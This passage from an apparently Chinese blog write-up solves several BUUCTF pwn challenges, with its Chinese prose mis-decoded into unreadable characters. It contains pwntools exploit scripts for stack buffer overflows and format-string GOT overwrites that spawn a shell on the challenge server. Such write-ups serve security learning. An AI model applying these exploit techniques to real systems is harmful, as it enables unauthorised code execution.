class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">29753</span>)<br><br>target = <span class="hljs-number">0x08048F13</span><br><br>payload = b<span class="hljs-string">&#x27;I&#x27;</span> * (<span class="hljs-number">21</span>) + b<span class="hljs-string">&#x27;a&#x27;</span> + p32(target)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">level0</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/level0&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ä»£ç æ®µ</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.<span class="hljs-keyword">text</span>:<span class="hljs-number">000000000040059</span>A                 mov     edi, <span class="hljs-built_in">offset</span> <span class="hljs-keyword">command</span> ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000000000040059</span>F                 call    <span class="hljs-title">_system</span><br></code></pre></td></tr></table></figure><p>çœ‹å †æ ˆç®—ä¸€ä¸‹åç§»</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7fffffffe1b0</span> â€”â–¸ <span class="hljs-number">0x7fffffffe1d0</span> â—‚â€” <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7fffffffe130</span> â—‚â€” <span class="hljs-number">0x0</span><br>*<span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x4005bf</span> (vulnerable_function+<span class="hljs-number">25</span>) â—‚â€” <span class="hljs-keyword">call</span> <span class="hljs-number">0x400470</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-<span class="hljs-number">64</span> / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>   <span class="hljs-number">0x4005aa</span> &lt;vulnerable_function+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>, -<span class="hljs-number">0x80</span><br>   <span class="hljs-number">0x4005ae</span> &lt;vulnerable_function+<span class="hljs-number">8</span>&gt;     <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x4005b2</span> &lt;vulnerable_function+<span class="hljs-number">12</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>, <span class="hljs-number">0x200</span><br>   <span class="hljs-number">0x4005b7</span> &lt;vulnerable_function+<span class="hljs-number">17</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x4005ba</span> &lt;vulnerable_function+<span class="hljs-number">20</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>, <span class="hljs-number">0</span><br> â–º <span class="hljs-number">0x4005bf</span> &lt;vulnerable_function+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">call</span>   read@plt                      &lt;read@plt&gt;<br><span class="hljs-symbol">        fd:</span> <span class="hljs-number">0x0</span> (/dev/pts/<span class="hljs-number">1</span>)<br><span class="hljs-symbol">        buf:</span> <span class="hljs-number">0x7fffffffe130</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-symbol">        nbytes:</span> <span class="hljs-number">0x200</span><br><br>   <span class="hljs-number">0x4005c4</span> &lt;vulnerable_function+<span class="hljs-number">30</span>&gt;    <span class="hljs-keyword">leave</span><br>   <span class="hljs-number">0x4005c5</span> &lt;vulnerable_function+<span class="hljs-number">31</span>&gt;    <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>å¡«å……0x80+8ä¸ªå­—èŠ‚å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26852</span>)<br><span class="hljs-comment"># sh = process(&#x27;./pwn&#x27;)</span><br>target = <span class="hljs-number">0x000000000040059A</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>) + p64(target)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-1"><a href="#ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-1" class="headerlink" title="[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5-1"></a>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5-1</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./pwn</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/pwn&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ç¨‹åºé€»è¾‘ï¼Œç”±äºreadè¯»å–99ï¼Œè€Œbufæ˜¯100ï¼Œå› æ­¤æ— æ³•è¿›è¡Œç¼“å†²åŒºæº¢å‡º</p><p>å†å¾€ä¸‹çœ‹ï¼Œè€ƒè™‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+14h] [ebp-70h] BYREF </span><br><br>srand(v1);<br>fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>read(fd, &amp;dword_804C044, <span class="hljs-number">4u</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your name:&quot;</span>);<br>read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x63</span>u);<span class="hljs-comment">//è¯»å…¥99</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br><span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>u);<br><span class="hljs-keyword">if</span> ( atoi(nptr) == dword_804C044 )<br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨‹åºé€»è¾‘ï¼š</p><ul><li>ä½¿ç”¨srandå‡½æ•°åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ï¼›</li><li>æ‰“å¼€/dev/urandomè®¾å¤‡ï¼Œå¹¶ä»ä¸­è¯»å–4ä¸ªå­—èŠ‚ï¼Œå­˜å…¥dword_804C044å˜é‡ï¼›</li><li>æç¤ºç”¨æˆ·è¾“å…¥ç”¨æˆ·åï¼Œä½¿ç”¨readå‡½æ•°ä»æ ‡å‡†è¾“å…¥ï¼ˆæ–‡ä»¶æè¿°ç¬¦ä¸º0ï¼‰ä¸­è¯»å–ä¸è¶…è¿‡99ä¸ªå­—èŠ‚çš„æ•°æ®å­˜å…¥bufæ•°ç»„ä¸­ï¼›</li><li>è¾“å‡ºâ€œHello, â€ä»¥åŠç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åï¼Œ<strong>æ³¨æ„æ­¤å¤„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</strong></li><li>æç¤ºç”¨æˆ·è¾“å…¥å¯†ç ï¼Œä½¿ç”¨readå‡½æ•°ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ä¸è¶…è¿‡15ä¸ªå­—èŠ‚çš„æ•°æ®å­˜å…¥nptræ•°ç»„ä¸­ï¼›</li><li>å°†nptræ•°ç»„ä¸­çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ç±»å‹ï¼Œå¦‚æœå’Œæ­¥éª¤2ä¸­è¯»å–çš„dword_804C044ç›¸ç­‰ï¼Œåˆ™è¾“å‡ºâ€œok!!â€ï¼Œå¹¶è°ƒç”¨systemå‡½æ•°æ‰“å¼€ä¸€ä¸ªshellï¼›</li><li>å¦‚æœä¸¤è€…ä¸ç›¸ç­‰ï¼Œåˆ™è¾“å‡ºâ€œfailâ€ã€‚</li><li>è¯»å–ä½ çš„åå­—å’Œå¯†ç ï¼Œå¦‚ä½•å’Œdword_804C044ç›¸åŒï¼Œé‚£ä¹ˆå°±å¾—åˆ°/bin/sh</li></ul><h2 id="æ€è·¯1ï¼šè¦†ç›–gotè¡¨"><a href="#æ€è·¯1ï¼šè¦†ç›–gotè¡¨" class="headerlink" title="æ€è·¯1ï¼šè¦†ç›–gotè¡¨"></a>æ€è·¯1ï¼šè¦†ç›–gotè¡¨</h2><p>è®¡ç®—ä¸€ä¸‹åç§»ä¸º10</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery">~$ ./pwn-buu<br>your<span class="hljs-built_in"> name</span>:AAAA<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<br>Hello,AAAAfffae618.<span class="hljs-number">63.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>.f7f4799<span class="hljs-number">0</span>.f7f359f9.<span class="hljs-number">8048034</span>.b.<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å°†åç»­ä¼šè¢«è°ƒç”¨çš„atoiå‡½æ•°çš„åœ°å€æ”¹å†™ä¸ºæˆ‘ä»¬çš„ç›®æ ‡åœ°å€ï¼Œè¿™æ ·å½“è°ƒç”¨atoiå‡½æ•°çš„æ—¶å€™ï¼Œå®é™…æ‰§è¡Œçš„å°±æ˜¯æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804932F                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, (aBinSh - <span class="hljs-number">804C000h</span>)[<span class="hljs-built_in">ebx</span>] <span class="hljs-comment">; &quot;/bin/sh&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08049335</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span>             <span class="hljs-comment">; command</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08049336</span>                 <span class="hljs-keyword">call</span>    _system<br></code></pre></td></tr></table></figure><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸­è‡ªå·±ç®—åç§»ã€å­—èŠ‚æ•°å¤ªéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pwntoolsçš„fmtstr_payloadå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25944</span>)<br><span class="hljs-comment">#sh = process(&#x27;./pwn-buu&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./pwn-buu&#x27;</span>)<br><br>atoi_got=elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br><br>target_addr=<span class="hljs-number">0x0804932F</span><br><br>payload=fmtstr_payload(<span class="hljs-number">10</span>,&#123;atoi_got:target_addr&#125;)<br><br>sh.send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>ä»£ç è¯´æ˜ï¼š</p><ul><li>å¯¼å…¥ pwn åº“ï¼›</li><li>è¿æ¥è¿œç¨‹ä¸»æœº <a href="http://node4.buuoj.cn/">node4.buuoj.cn</a> çš„ 25944 ç«¯å£ï¼ˆæˆ–è€…ä½¿ç”¨æœ¬åœ°è¿›ç¨‹ï¼‰ï¼›</li><li>è§£æ ELF å¯æ‰§è¡Œæ–‡ä»¶ pwn-buuï¼Œè·å– atoi å‡½æ•°çš„ GOT åœ°å€ï¼›</li><li>æŒ‡å®šç›®æ ‡å‡½æ•°åœ°å€ target_addrï¼Œæ­¤å¤„ä¸º 0x0804932Fï¼›</li><li>è°ƒç”¨ fmtstr_payload() å‡½æ•°ç”Ÿæˆæ¶æ„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°† atoi å‡½æ•°çš„ GOT åœ°å€è¦†ç›–ä¸ºç›®æ ‡åœ°å€ï¼›</li><li>å°† payload å‘é€ç»™ç›®æ ‡ä¸»æœºï¼Œå¹¶è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œç­‰å¾…æ”»å‡»ç»“æœã€‚</li></ul><h2 id="æ€è·¯2ï¼šæ”¹å†™dword-804C044å€¼"><a href="#æ€è·¯2ï¼šæ”¹å†™dword-804C044å€¼" class="headerlink" title="æ€è·¯2ï¼šæ”¹å†™dword_804C044å€¼"></a>æ€è·¯2ï¼šæ”¹å†™dword_804C044å€¼</h2><p>æŠŠ0x804C044çš„å€¼æ”¹å†™ä¸º0ï¼Œç„¶åè¾“å…¥å¯†ç 0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25944</span>)<br><span class="hljs-comment">#sh = process(&#x27;./pwn-buu&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./pwn-buu&#x27;</span>)<br><br><span class="hljs-comment">#atoi_got=elf.got[&#x27;atoi&#x27;]</span><br><br>dword_804C044=<span class="hljs-number">0x804C044</span><br><br>target_addr=<span class="hljs-number">0x0804932F</span><br><br>payload=fmtstr_payload(<span class="hljs-number">10</span>,&#123;dword_804C044:<span class="hljs-number">0x0</span>&#125;)<br><br>sh.sendlineafter(<span class="hljs-string">&#x27;your name:&#x27;</span>,payload)<br>sh.sendlineafter(<span class="hljs-string">&#x27;your passwd:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x0</span>))<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  init(*(_QWORD *)&amp;argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE                            hh      iii                &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to this Encryption machine\n&quot;</span>);<br>  begin();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      fflush(<span class="hljs-number">0LL</span>);<br>      v4 = <span class="hljs-number">0</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I think you can do it by yourself&quot;</span>);<br>      begin();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    encrypt();<br>    begin();<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥encryptå‡½æ•°çœ‹ä¸€ä¸‹ï¼Œå‘ç°å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œäº†å¼‚æˆ–ï¼ŒæŒ‰ç†è¯´éœ€è¦å†å¼‚æˆ–ä¸€æ¬¡å¾—åˆ°åŸå€¼ï¼Œä½†æ˜¯strlen(s)åˆ¤å®šæ¡ä»¶å¯¼è‡´äº†ä¸ä¼šå¯¹rbpå’Œè¿”å›åœ°å€è¿›è¡Œå¼‚æˆ–ï¼Œå› æ­¤ä¸éœ€è¦å†å¼‚æˆ–ä¸€æ¬¡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">encrypt</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">size_t</span> v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v0 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)x;<br>    <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-built_in">strlen</span>(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">96</span> || s[x] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">64</span> || s[x] &gt; <span class="hljs-number">90</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( s[x] &gt; <span class="hljs-number">47</span> &amp;&amp; s[x] &lt;= <span class="hljs-number">57</span> )<br>          s[x] ^= <span class="hljs-number">0xF</span>u;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        s[x] ^= <span class="hljs-number">0xE</span>u;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      s[x] ^= <span class="hljs-number">0xD</span>u;<br>    &#125;<br>    ++x;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Ciphertext&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€è·¯ï¼š</p><ul><li>ä½¿ç”¨ROPæ³„éœ²å‡ºputsçš„gotåœ°å€ï¼Œå†åˆ©ç”¨LibcSearcherå¾—åˆ°libcçš„ç‰ˆæœ¬</li><li>ç”±äºlibcå†…çš„å‡½æ•°æœ€ä½12ä½ä¸éšç€libcåº“ç‰ˆæœ¬çš„æ”¹å˜è€Œæ”¹å˜ï¼Œå› 